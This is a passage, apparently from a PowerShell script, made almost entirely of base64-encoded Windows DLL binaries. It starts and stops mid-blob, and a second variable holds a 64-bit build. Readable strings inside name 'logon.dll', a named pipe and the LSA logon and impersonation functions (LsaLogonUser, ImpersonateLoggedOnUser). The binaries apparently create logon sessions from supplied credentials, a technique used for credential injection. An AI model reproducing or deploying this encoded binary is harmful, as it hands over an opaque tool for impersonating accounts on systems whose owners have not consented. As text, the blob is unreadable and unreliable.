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z9lbmRsQHN0ZEBAWUFBQVY/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAMUBBQVYyMUBAWgAAowM/Zmx1c2hAPyRiYXNpY19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFQUFWMTJAWFoA/wQ/c2V0c3RhdGVAPyRiYXNpY19pb3NARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQUVYSF9OQFoAAIQCP19Pc2Z4QD8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFBRVhYWgAAXAU/dW5jYXVnaHRfZXhjZXB0aW9uQHN0ZEBAWUFfTlhaABgFP3NwdXRjQD8kYmFzaWNfc3RyZWFtYnVmQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFSERAWgAbBT9zcHV0bkA/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFBRV9KUEJEX0pAWgAAAQE/PzY/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQUVBQVYwMUBLQFoAAAABPz82PyRiYXNpY19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFQUFWMDFASkBaAAD+AD8/Nj8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFBRUFBVjAxQEhAWgAABQE/PzY/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQUVBQVYwMUBQNkFBQVYwMUBBQVYwMUBAWkBaAABNU1ZDUDExMC5kbGwAACoGbWVtbW92ZQAxBF9wdXJlY2FsbABzAD8/M0BZQVhQQVhAWgAAcQA/PzJAWUFQQVhJQFoAAE1TVkNSMTEwLmRsbAAAfANfbG9jawDmBF91bmxvY2sAKwJfY2FsbG9jX2NydACsAV9fZGxsb25leGl0ACIEX29uZXhpdABwAD8/MXR5cGVfaW5mb0BAVUFFQFhaAABzAV9fQ3BwWGNwdEZpbHRlcgAVAl9hbXNnX2V4aXQAAOQFZnJlZ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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        $Logon64Bit_Base64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABKZAQODgVqXQ4Fal0OBWpdkKWtXQ8Fal3/w6ddDwVqXf/DpF0EBWpd/8OhXQoFal3/w6VdCwVqXQ4Fa11FBWpd8nLTXQkFal3M6bldDQVqXczpoF0PBWpdzOmjXQ8Fal3M6aZdDwVqXVJpY2gOBWpdAAAAAAAAAABQRQAAZIYGAOvOhVIAAAAAAAAAAPAAIiALAgsAABwAAAAoAAAAAAAAkCIAAAAQAAAAAACAAQAAAAAQAAAAAgAABgAAAAAAAAAGAAAAAAAAAACQAAAABAAAAAAAAAIAYAEAABAAAAAAAAAQAAAAAAAAAAAQAAAAAAAAEAAAAAAAAAAAAAAQAAAAAEcAAEUAAADMPAAAeAAAAABwAADgAQAAAGAAABACAAAAAAAAAAAAAACAAABwAAAAkDIAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgNgAAcAAAAAAAAAAAAAAAADAAADACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAO8aAAAAEAAAABwAAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAABFFwAAADAAAAAYAAAAIAAAAAAAAAAAAAAAAAAAQAAAQC5kYXRhAAAAEAcAAABQAAAAAgAAADgAAAAAAAAAAAAAAAAAAEAAAMAucGRhdGEAABACAAAAYAAAAAQAAAA6AAAAAAAAAAAAAAAAAABAAABALnJzcmMAAADgAQAAAHAAAAACAAAAPgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAAtAAAAACAAAAAAgAAAEAAAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEBTSIPsIEiNBQMkAABIi9lIiQH2wgF0Bv8VsiEAAEiLw0iDxCBbw8zMzMzMzMzMzESJAkiJSghIi8LDzMzMzMxAU0iD7DBIiwFJi9hEi8JIjVQkIP9QGEiLSwhIOUgIdQ6LCzkIdQiwAUiDxDBbwzLASIPEMFvDzMzMzMzMzMzMSDtKCHUIRDkCdQOwAcMywMPMzMzMzMzMzMzMzMzMzMxIjQVJIgAAw8zMzMzMzMzMSIlcJAhXSIPsMDPbQYvISIv6iVwkIP8VRCAAAEjHRxgPAAAASIXASIlfEEiNFRYiAABID0XQiB84GnQNSIPL/0j/w4A8GgB190yLw0iLz+hMAQAASItcJEBIi8dIg8QwX8PMzMzMzMzMzMzMzMzMzEiNBeEhAADDzMzMzMzMzMxAU0iD7DAzwEiL2olEJCBBg/gBdSpIx0IYDwAAAEiJQhCIAkiNFb4hAABEjUAVSIvL6OoAAABIi8NIg8QwW8PoPP///0iLw0iDxDBbw8zMzEiNBakhAADDzMzMzMzMzMxIiVwkCFdIg+wwM9tBi8hIi/qJXCQg/xVsHwAASMdHGA8AAABIhcBIiV8QSI0VNiEAAEgPRdCIHzgadA1Ig8v/SP/DgDwaAHX3